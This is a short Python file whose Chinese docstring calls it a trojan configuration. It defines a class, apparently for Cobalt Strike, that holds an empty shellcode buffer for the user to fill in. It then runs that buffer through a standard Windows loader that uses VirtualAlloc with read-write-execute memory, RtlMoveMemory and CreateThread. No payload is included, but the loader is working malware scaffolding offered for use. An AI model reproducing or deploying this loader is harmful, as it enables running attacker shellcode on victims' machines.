'''
此文件为木马文件配置
'''
import ctypes

class cs_run:
    def __init__(self):
        pass

    def set_shellcode(self):
        #此处自行设置shellcode
        self.buf = ''
        self.buf += ''

    def run_cs(self):
        self.set_shellcode()
        #此处自行设置加载器
        print("加载器启动")
        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
        rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(self.buf), 0x3000, 0x40)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(self.buf), len(self.buf))
        handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
        ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
